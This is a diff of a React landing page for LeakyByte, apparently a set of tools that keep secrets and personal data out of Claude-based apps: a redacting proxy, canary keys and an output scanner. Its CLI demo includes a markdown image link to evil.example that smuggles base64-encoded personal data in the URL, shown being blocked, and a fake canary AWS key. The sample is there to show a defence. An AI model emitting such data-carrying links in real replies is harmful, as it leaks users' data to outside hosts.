@@ -1,12 +1,12 @@
-import Demo from "@/components/Demo";
+import Playground from "@/components/Playground";
 
 const EMAIL = "hello@leakybyte.xyz";
 
-const steps = [
-  ["Intercept", "Point your Claude SDK at the LeakyByte proxy. Prompts, tool results and attached text pass through it."],
-  ["Swap", "Secrets and personal data are replaced with stable placeholders. The same value always gets the same placeholder, so Claude can still reason about it."],
-  ["Restore", "Placeholders in Claude's reply are swapped back before your app sees it. Every swap is written to an audit log."],
-];
+const products = [
+  ["Veil", "Before the model", "A proxy for the Claude API. It swaps API keys and personal data for placeholders on the way out and restores them in the reply."],
+  ["Canary", "In your data", "Mint fake keys that look real and plant them in configs, docs and prompts. If one shows up in a log or an output, you know where it leaked from."],
+  ["Plug", "After the model", "Scans model output for ways data escapes: image links that carry data in the URL, invisible text, and secrets. It blocks them before your app renders the reply."],
+] as const;
 
 const detects = [
   ["API keys", "Anthropic, AWS, GitHub, generic sk- keys"],
@@ -19,27 +19,24 @@ const detects = [
 const snippet = `import Anthropic from "@anthropic-ai/sdk";
 
 const client = new Anthropic({
-  baseURL: "http://127.0.0.1:8787", // LeakyByte proxy
+  baseURL: "http://127.0.0.1:8787", // Veil proxy
 });
 
 // Everything else stays the same.
 const msg = await client.messages.create({ ... });`;
 
-const run = `$ npm install
-$ npm run proxy
-LeakyByte proxy on http://127.0.0.1:8787
+const cli = `$ npm run lb canary mint prod aws
+AKIAPRODC3EDOIU4P2TK
+
+$ echo "env: AWS_ACCESS_KEY_ID=AKIAPRODC3EDOIU4P2TK" | npm run lb canary check
+LEAK: aws canary "PROD" at char 28
+
+$ echo 'hi ![x](https://evil.example/a.png?d=ZGFuYS5yZXllc0Bub3J0aHdpbmQ=)' | npm run lb plug
+hi ![x]([blocked link to evil.example])
+URL: evil.example carries data in the query string
 
 $ npm test
-✔ non-streaming: upstream sees placeholders, client gets real values
-✔ streaming: placeholder split across deltas is restored
-✔ redacts, reuses placeholders, skips invalid cards, restores
-ℹ pass 3   ℹ fail 0`;
-
-const flow = [
-  ["Your app", "Email dana.reyes@northwind.example about key sk-ant-api03-Zk3v…", false],
-  ["LeakyByte proxy", "Email ‹EMAIL_1› about key ‹ANTHROPIC_KEY_1›", true],
-  ["Claude API", "Will email ‹EMAIL_1›.", true],
-] as const;
+ℹ pass 6   ℹ fail 0`;
 
 export default function Home() {
   return (
@@ -49,51 +46,45 @@ export default function Home() {
           Leaky<span className="bar font-display">Byte</span>
         </a>
         <nav className="flex items-center gap-6 text-sm text-muted">
-          <a className="hover:text-paper" href="#how">How it works</a>
-          <a className="hover:text-paper" href="#build">Use it</a>
+          <a className="hover:text-paper" href="#try">Try it</a>
+          <a className="hover:text-paper" href="#products">Products</a>
+          <a className="hover:text-paper" href="#use">Use it</a>
           <a className="rounded bg-paper px-3 py-1.5 font-medium text-ink" href="#access">Early access</a>
         </nav>
       </header>
 
       <main>
-        <section className="mx-auto max-w-6xl px-6 pb-20 pt-16 md:pt-24">
+        <section id="try" className="mx-auto max-w-6xl scroll-mt-8 px-6 pb-20 pt-16 md:pt-24">
           <h1 className="max-w-4xl font-display text-5xl font-extrabold leading-[1.02] tracking-tight md:text-7xl">
-            Keep secrets out of your prompts.
+            Stop your AI app from leaking data.
           </h1>
           <p className="mt-6 max-w-xl text-lg leading-relaxed text-muted">
-            LeakyByte sits between your app and the Claude API. It swaps API keys and personal data for placeholders on the
-            way out, and puts them back in the reply. Try it below. This runs in your browser; nothing is sent anywhere.
+            Three small tools for teams building on Claude: one before the model, one in your data, one after the model.
+            Try each one below. Everything runs in your browser and nothing is sent anywhere.
           </p>
-          <div className="mt-12"><Demo /></div>
+          <div className="mt-12"><Playground /></div>
         </section>
 
-        <section id="how" className="mx-auto max-w-6xl scroll-mt-8 px-6 py-20">
-          <h2 className="font-display text-3xl font-bold tracking-tight md:text-4xl">Three steps, no app rewrite</h2>
-          <ol className="mt-10 grid gap-10 md:grid-cols-3">
-            {steps.map(([t, d], i) => (
-              <li key={t} className="border-t border-edge pt-5">
-                <span className="font-mono text-sm text-lit">Step {i + 1}</span>
-                <h3 className="mt-2 font-display text-xl font-semibold">{t}</h3>
-                <p className="mt-2 max-w-sm leading-relaxed text-muted">{d}</p>
-              </li>
-            ))}
-          </ol>
-          <div className="mt-14 grid gap-px overflow-hidden rounded-lg border border-edge bg-edge md:grid-cols-3">
-            {flow.map(([who, text, masked]) => (
-              <div key={who} className="bg-raise p-5">
-                <p className="font-display text-sm font-semibold text-muted">{who}</p>
-                <p className="mt-3 font-mono text-sm leading-relaxed">
-                  {masked ? <span className="bar whitespace-normal">{text}</span> : text}
-                </p>
+        <section id="products" className="mx-auto max-w-6xl scroll-mt-8 px-6 py-20">
+          <h2 className="font-display text-3xl font-bold tracking-tight md:text-4xl">One request, three places to leak</h2>
+          <p className="mt-4 max-w-2xl leading-relaxed text-muted">
+            Data leaves an AI app before the model sees it, from the files you hand it, and in what it says back. Each product
+            covers one of those, and they share one detection engine.
+          </p>
+          <div className="mt-10 grid gap-px overflow-hidden rounded-lg border border-edge bg-edge md:grid-cols-3">
+            {products.map(([name, where, desc]) => (
+              <div key={name} className="bg-raise p-6">
+                <p className="text-sm text-lit">{where}</p>
+                <h3 className="mt-2 font-display text-2xl font-bold">{name}</h3>
+                <p className="mt-3 leading-relaxed text-muted">{desc}</p>
               </div>
             ))}
           </div>
-          <p className="mt-3 text-sm text-muted">The reply travels back the same way: placeholders in, real values out.</p>
         </section>
 
-        <section id="build" className="mx-auto grid max-w-6xl scroll-mt-8 gap-12 px-6 py-20 md:grid-cols-2">
+        <section id="use" className="mx-auto grid max-w-6xl scroll-mt-8 gap-12 px-6 py-20 md:grid-cols-2">
           <div>
-            <h2 className="font-display text-3xl font-bold tracking-tight md:text-4xl">One line to adopt</h2>
+            <h2 className="font-display text-3xl font-bold tracking-tight md:text-4xl">Veil is one line to adopt</h2>
             <p className="mt-4 max-w-md leading-relaxed text-muted">
               The proxy speaks the Claude Messages API, including streaming, so changing the base URL is the whole integration.
               Your Anthropic key passes straight through and is never stored. The audit log records what kinds of values were
@@ -117,14 +108,14 @@ export default function Home() {
           <div>
             <h2 className="font-display text-3xl font-bold tracking-tight md:text-4xl">Where we are</h2>
             <p className="mt-4 max-w-md leading-relaxed text-muted">
-              LeakyByte is early. The proxy runs locally today: it redacts requests, restores replies in both normal and
-              streaming responses, and writes an audit log. The test suite runs it against a mock Claude server. Still to
-              come: a hosted version, a dashboard for the audit log, custom detectors, and wider checks against the live API.
-              We build with Claude Code.
+              LeakyByte is early. All three tools work today, in the browser and from a command line. Veil also runs as a local
+              proxy that restores replies in normal and streaming responses and writes an audit log. The tests run the proxy
+              against a mock Claude server. Still to come: Plug and Canary checks inside the proxy, a hosted version, a
+              dashboard, and wider checks against the live API. We build with Claude Code.
             </p>
           </div>
           <pre className="self-start overflow-x-auto rounded-lg border border-edge bg-raise p-5 font-mono text-sm leading-relaxed">
-            <code>{run}</code>
+            <code>{cli}</code>
           </pre>
         </section>
 
